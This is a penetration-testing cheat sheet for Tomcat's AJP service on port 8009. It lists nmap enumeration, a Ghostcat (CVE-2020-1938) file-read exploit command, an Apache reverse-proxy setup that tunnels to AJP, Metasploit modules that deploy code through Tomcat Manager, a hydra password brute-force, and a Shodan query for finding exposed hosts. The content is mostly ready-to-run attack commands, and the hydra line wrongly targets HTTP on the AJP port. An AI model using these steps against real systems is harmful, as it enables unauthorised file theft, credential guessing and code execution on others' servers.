# AJP (Port 8009) Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating AJP (port 8009), I realistically expect to find:

- [ ] Exposed Tomcat AJP service accepting backend requests
- [ ] Potential CVE-2020-1938 (Ghostcat) LFI vulnerability
- [ ] Ability to read sensitive files (e.g., WEB-INF/web.xml)
- [ ] Possibility to proxy to Tomcat Manager interface
- [ ] IDS/IPS evasion via binary protocol tunneling
- [ ] No direct RCE without chaining further attacks

---

## ‚úÖ AJP Pentest Checklist

- [ ] **Service Detection**
  - Confirm service and banner.
    ```
    nmap -sV -p8009 <IP>
    ```

- [ ] **Nmap Enumeration Scripts**
  - Run NSE scripts for deeper analysis.
    ```
    nmap --script ajp-auth,ajp-headers,ajp-methods,ajp-request -p8009 <IP>
    ```

- [ ] **Check for Ghostcat (CVE-2020-1938)**
  - Validate LFI by attempting to fetch internal files.
    - Common targets:
      ```
      WEB-INF/web.xml
      META-INF/context.xml
      ```
  - Exploit example:
    ```
    python exploit-ghostcat.py -t <IP> -p 8009 -f WEB-INF/web.xml
    ```

- [ ] **Set Up Apache Reverse Proxy**
  - Redirect local HTTP requests to AJP.
    ```
    sudo apt-get install libapache2-mod-jk
    sudo vim /etc/apache2/ajp.conf
    ```
    Example ajp.conf:
    ```
    ProxyRequests Off
    <Proxy *>
        Order deny,allow
        Deny from all
        Allow from localhost
    </Proxy>
    ProxyPass / ajp://<TARGET_IP>:8009/
    ProxyPassReverse / ajp://<TARGET_IP>:8009/
    ```
  - Enable modules and restart Apache.
    ```
    sudo a2enmod proxy_http
    sudo a2enmod proxy_ajp
    sudo systemctl restart apache2
    ```

- [ ] **Exploitation via Proxy**
  - Use local Apache to attack Tomcat Manager.
    ```
    msf> use exploit/multi/http/tomcat_mgr_deploy
    set RHOSTS 127.0.0.1
    set RPORT 80
    run
    ```

- [ ] **Brute Forcing Tomcat Credentials**
  - Attempt to discover weak passwords.
    ```
    hydra -l tomcat -P passwords.txt http-get://<IP>:8009/
    ```

---

## ‚úÖ Metasploit Modules

- **Scanner**
    ```
    use auxiliary/scanner/http/tomcat_mgr_login
    ```
- **Exploitation**
    ```
    use exploit/multi/http/tomcat_mgr_upload
    use exploit/multi/http/tomcat_mgr_deploy
    ```

---

## ‚úÖ Shodan Search

- Quickly find exposed AJP services on the internet.
    ```
    port:8009
    ```
